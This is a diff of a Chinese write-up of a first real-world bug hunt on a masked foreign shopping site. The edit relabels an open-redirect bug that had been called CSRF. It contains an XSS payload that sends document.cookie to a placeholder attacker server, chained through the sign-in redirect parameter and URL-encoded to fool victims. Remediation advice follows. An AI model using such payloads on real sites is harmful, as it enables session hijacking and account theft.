@@ -1,7 +1,7 @@
 
 # （真实世界）我的第一次真实对国外某购物平台web漏洞挖掘
 
-- CSRF - 低危
+- 开放重定向 - 低危
 - XSS - 低危
 
 这两组合起来就完全不一样一点的，个人觉得比原本高一些
@@ -10,7 +10,7 @@
 
 ## 前言
 
-**这是我第一次，真实世界的web漏洞挖掘（csrf + xss）**
+**这是我第一次，真实世界的web漏洞挖掘（开发重定向 + xss）**
 
 **虽然这两个漏洞都比较简单，但这是我第一次的真实漏洞挖掘，当然要记录一下，哪怕再简单**  
 **虽然这两个漏洞都比较简单，但这是我第一次的真实漏洞挖掘，当然要记录一下，哪怕再简单**  
@@ -32,7 +32,7 @@
 
 ---
 
-## url参数重定向 - CSRF
+## url参数重定向 - OpenRedirect
 
 分析：
 
@@ -51,15 +51,15 @@
 
 ---
 
-## csrf的好兄弟
+## open redirect的好兄弟
 
-我们都知道，单单一个csrf通常情况下危害不大，甚至可以忽略不计，没啥用
+我们都知道，单单一个开放重定向通常情况下危害不大，甚至可以忽略不计，没啥用
 
-但是csrf可以搭配其他漏洞来做一套组合拳，这个漏洞就是xss.
+但是可以搭配其他漏洞来做一套组合拳，这个漏洞就是xss.
 
-通过csrf漏洞将受害者重定向到被攻击者控制的具有xss漏洞的页面上，执行恶意js代码
+通过开放重定向漏洞将受害者重定向到被攻击者控制的具有xss漏洞的页面上，执行恶意js代码
 
-通过这套csrf + xss
+通过这套开放重定向 + xss
 
 攻击者很容易获得一些信息，如：
 
@@ -92,11 +92,11 @@
 
 ---
 
-## XSS + CSRF - 组合拳
+## XSS + OpenRedirect - 组合拳
 
 **兔年万事如意，心想事成**
 
-现在我们可以尝试简单的利用xss+csrf获取用户的cookie
+现在我们可以尝试简单的利用xss+开放重定向获取用户的cookie
 
 构造XSS Payload:
 
@@ -117,7 +117,7 @@
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/ed9395ed2e31404fa59b6b51898535d5.png)
 
 
-现在让我们将xss和csrf组合起来：
+现在让我们将xss和开放重定向组合起来：
 
 实现**让用户点击我们的精心设计过的登录url，即可窃取该用户的cookie等**
 
@@ -135,11 +135,11 @@ XSS Payload:
 
 	https://www.nonono.co.uk/search?nonono='<script>fetch('//<攻击者http服务器>/?cookie='+btoa(document.cookie));</script>
 
-CSRF Payload:
+OpenRedirect Payload:
 
 	https://www.nonno.co.uk/sign-in?redirect=https://www.nonono.co.uk/search?nonono='<script>fetch('//<攻击者http服务器>/?cookie='+btoa(document.cookie));</script>
 
-解析：当已登录用户点击此csrf payload的url，将重定向到xss漏洞处并执行我们指定的恶意js代码，这里的js代码使用fetch发送请求到我们攻击者的http服务器并附带cookie
+解析：当已登录用户点击此OpenRedirect payload的url，将重定向到xss漏洞处并执行我们指定的恶意js代码，这里的js代码使用fetch发送请求到我们攻击者的http服务器并附带cookie
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/ed9395ed2e31404fa59b6b51898535d5.png)
 
@@ -147,13 +147,15 @@ CSRF Payload:
 
 **只要适当的将payload进行urlencode，受害者可能根本无法判断！**
 
+**更进一步的利用：OpenRedirect + XSS，再加csrf等等等等，危害还能在提升**
+
 ---
 
 ## 漏洞修补建议
 
-### CSRF
+### OpenRedirect
 
-- 不要使用url参数(GET or POST)来进行重定向
+- 不要使用url参数(GET or POST)来进行重定向，即便使用，也要做好防护，避免idor
 - 完善各个功能的csrf防护
 
 ### XSS
@@ -165,7 +167,7 @@ CSRF Payload:
 
 ## 结束
 
-事实上我这里只找了一个xss和一个csrf漏洞，很难猜测其他地方是否还存在其他漏洞。
+事实上我这里只找了两个漏洞，很难猜测其他地方是否还存在其他漏洞。
 
 希望平台管理方认真做好安全防护
 
